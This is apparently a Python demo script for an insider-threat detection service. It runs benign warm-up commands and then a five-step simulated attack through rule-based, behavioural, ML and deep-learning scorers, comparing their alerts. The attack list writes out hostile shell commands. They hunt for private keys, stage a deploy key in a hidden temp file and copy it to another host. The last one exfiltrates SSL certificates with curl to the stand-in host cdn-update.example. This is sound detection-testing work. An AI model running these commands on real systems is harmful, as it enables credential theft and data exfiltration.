"""
Demonstration: progressive insider attack in 5 commands.

Compares tabular hybrid (rules + UEBA + IF/RF) vs deep-learning sequence/GNN.

Run:
  cd ai-security-service
  python -m aiss.evaluation.train_dl
  python -m aiss.evaluation.demo_sequence_attack
"""

from __future__ import annotations

import json
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from typing import List

from aiss.config import load_policy, settings
from aiss.pipeline.behavioral import BehavioralEngine, BaselineStore, combine_assessments
from aiss.pipeline.dl_gnn import GNNEngine
from aiss.pipeline.dl_sequence import SequenceDLEngine
from aiss.pipeline.enrichment import FeatureStore, RulesEngine
from aiss.pipeline.ml_engine import MLEngine
from aiss.pipeline.moo_solver import MOOSolver


ATTACKER = 'admin-eve'
ASSET = 'prod-web-1'
IP = '203.0.113.10'
SESSION = 'session-demo-lateral-5'
ACCOUNT = 'ubuntu'
HOUR = 10


def _ts(minute: int) -> str:
    return datetime(2026, 7, 9, HOUR, minute, 0, tzinfo=timezone.utc).isoformat()


def _cmd_event(command: str, minute: int, session_id: str = SESSION) -> dict:
    return {
        'event_id': f'demo-{minute}',
        'event_type': 'command.ingested',
        'timestamp': _ts(minute),
        'session_id': session_id,
        'user_id': ATTACKER,
        'asset_id': ASSET,
        'account': ACCOUNT,
        'protocol': 'ssh',
        'remote_addr': IP,
        'payload': {'input': command},
        'metadata': {'source': 'demo_sequence_attack'},
    }


WARMUP_COMMANDS = [
    'ls -la /var/log',
    'systemctl status nginx',
    'tail -n 50 /var/log/app.log',
    'df -h',
    'whoami',
    'cat /etc/hostname',
]

ATTACK_SEQUENCE = [
    ('1 — credential recon', 'find /home -name "*.pem" -o -name "id_rsa" 2>/dev/null'),
    ('2 — staging keys', 'cp /var/www/.ssh/deploy_key /tmp/.cache_update'),
    ('3 — trust probe', 'ssh -o BatchMode=yes -o ConnectTimeout=3 prod-db whoami'),
    ('4 — lateral access', 'scp -o StrictHostKeyChecking=no /tmp/.cache_update backup@prod-db:/tmp/'),
    ('5 — exfiltration', 'tar czf /tmp/logs.tgz /etc/nginx/ssl && curl -s -F f=@/tmp/logs.tgz https://cdn-update.example/upload'),
]


def run_demo():
    policy = load_policy()
    model_dir = settings.ml_model_dir
    with tempfile.TemporaryDirectory() as tmp:
        feat_path = Path(tmp) / 'features.json'
        base_path = Path(tmp) / 'baselines.json'

        store = FeatureStore(str(feat_path))
        behavioral = BehavioralEngine(policy, store=BaselineStore(str(base_path)))
        rules = RulesEngine(policy)
        ml = MLEngine(policy, model_dir=model_dir)
        seq_dl = SequenceDLEngine(policy, model_dir=model_dir)
        gnn = GNNEngine(policy, model_dir=model_dir)
        moo = MOOSolver(policy)

        rows = []

        for i, cmd in enumerate(WARMUP_COMMANDS):
            ev = _cmd_event(cmd, minute=i)
            enriched = store.enrich(ev)
            ra = rules.score(enriched)
            ba = behavioral.score(enriched)
            ma = ml.score(enriched)
            sa = seq_dl.score(enriched)
            ga = gnn.score(enriched)
            fused_tab = combine_assessments(ra, ba, ma, policy=policy)
            fused_all = combine_assessments(ra, ba, ma, sa, ga, policy=policy)
            behavioral.learn(enriched, fused_tab['risk_score'])
            decision = moo.decide(enriched, fused_tab)
            rows.append({
                'phase': f'warmup-{i+1}',
                'command': cmd,
                'rules': ra['risk_score'],
                'ueba': ba['risk_score'],
                'ml': ma['risk_score'],
                'dl_seq': sa['risk_score'],
                'dl_gnn': ga['risk_score'],
                'fused_tabular': fused_tab['risk_score'],
                'fused_all': fused_all['risk_score'],
                'action': decision['action'],
                'seq_reasons': sa.get('reasons', []),
            })

        for label, cmd in ATTACK_SEQUENCE:
            minute = 10 + len([r for r in rows if not r['phase'].startswith('warmup')]) + 1
            ev = _cmd_event(cmd, minute=minute)
            enriched = store.enrich(ev)
            ra = rules.score(enriched)
            ba = behavioral.score(enriched)
            ma = ml.score(enriched)
            sa = seq_dl.score(enriched)
            ga = gnn.score(enriched)
            fused_tab = combine_assessments(ra, ba, ma, policy=policy)
            fused_all = combine_assessments(ra, ba, ma, sa, ga, policy=policy)
            decision_tab = moo.decide(enriched, fused_tab)
            decision_all = moo.decide(enriched, fused_all)
            rows.append({
                'phase': label,
                'command': cmd,
                'rules': ra['risk_score'],
                'ueba': ba['risk_score'],
                'ml': ma['risk_score'],
                'dl_seq': sa['risk_score'],
                'dl_gnn': ga['risk_score'],
                'fused_tabular': fused_tab['risk_score'],
                'fused_all': fused_all['risk_score'],
                'action': decision_tab['action'],
                'action_with_dl': decision_all['action'],
                'ueba_reasons': ba.get('reasons', []),
                'rules_reasons': ra.get('reasons', []),
                'seq_reasons': sa.get('reasons', []),
                'gnn_reasons': ga.get('reasons', []),
            })
            behavioral.learn(enriched, fused_tab['risk_score'])

    out_dir = Path(__file__).resolve().parents[2] / 'data' / 'research'
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / 'SEQUENCE_ATTACK_DEMO.json'
    out_path.write_text(json.dumps(rows, indent=2), encoding='utf-8')

    tau = policy['thresholds']['alert']
    print('=== CyberVault: progressive 5-command insider attack (with DL) ===')
    print(f'User={ATTACKER} asset={ASSET} IP={IP} hour={HOUR}:00 UTC')
    print(f'Model dir: {model_dir}')
    print(f'Alert threshold tau_a = {tau}')
    print()
    for row in rows:
        if row['phase'].startswith('warmup'):
            continue
        print(f"[{row['phase']}]")
        print(f"  $ {row['command'][:72]}{'...' if len(row['command'])>72 else ''}")
        print(f"  rules={row['rules']:.2f}  ueba={row['ueba']:.2f}  ml={row['ml']:.2f}  "
              f"tabular={row['fused_tabular']:.2f}  -> {row['action']}")
        print(f"  dl_seq={row['dl_seq']:.2f}  dl_gnn={row['dl_gnn']:.2f}  "
              f"hybrid+DL={row['fused_all']:.2f}  -> {row['action_with_dl']}")
        print(f"  seq_reasons={row.get('seq_reasons', [])}")
        print()
    print(f'Full trace written to {out_path}')
    return rows


if __name__ == '__main__':
    run_demo()
